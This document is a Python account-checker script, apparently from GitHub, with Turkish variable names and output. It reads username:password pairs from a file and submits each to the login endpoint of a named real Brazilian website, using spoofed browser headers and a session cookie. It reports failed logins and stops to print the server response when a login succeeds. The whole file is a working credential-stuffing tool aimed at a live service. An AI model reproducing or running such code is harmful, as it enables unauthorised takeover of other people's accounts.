#!/usr/bin/python3
#Creator: http://github.com/aligollez

from time import sleep


try:
    import requests, json, argparse, sys
    from colorama import Fore, Style


    
except Exception:
    print()
    print(" [!] Error. Libraries not installed.")
    print(" [i] Run: pip install <package name>")
    print(" [i] Required packages: requests, json, argparse, sys, bs4, colorama.")
    print()
    exit(1)

################################### EDIT ME ###################################

headers = {
    'authority': 'www.e-htl.com.br',
    'accept': '*/*',
    'accept-language': 'en,tr;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': '_ga=GA1.3.1650582049.1661648733; _gid=GA1.3.838604131.1663886871; _e_id=og26lqm9pp67tgmgujaikbga8i',
    'origin': 'https://www.e-htl.com.br',
    'referer': 'https://www.e-htl.com.br/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'x-requested-with': 'XMLHttpRequest',
}

###############################################################################

# Functions for text with color
def success_text(text, text2):
    print()
    print(" %s%s%s[+] %s >> %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.GREEN, text, text2, Style.RESET_ALL))
    print()
def error_text(text):
    print()
    print(" %s%s%s[!] %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.RED, text, Style.RESET_ALL))
    print()

parser = argparse.ArgumentParser()
args = parser.parse_args
# Send the request
def funct():
    CCList = open('accounts.txt', "r+", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split(':')
        kartlar.append((bolum[0], bolum[1]) ,)

    return kartlar

kartlar = funct()
for (kadi, sifre) in kartlar:
    data = {
  'returnTo': '',
  'usuario': kadi,
  'senha': sifre
    }


    yanlispass = ('{"erro":1,"mensagem":"Usu\\u00e1rio ou senha incorretos","indices":[]}')
    http = requests.post('https://www.e-htl.com.br/ajax/acoes/login.php', headers=headers, data=data)
    cevap = http.text
        
    if yanlispass in http.text:
        print(Style.RESET_ALL, Style.BRIGHT, Fore.RED,'Yanlis Kullanici Sifre',data, Style.RESET_ALL)
        print('----------------')
        print('----------------')
        sleep(0.4)
            
    else:
        print(Fore.GREEN +cevap,data)
            
			
        exit(1)
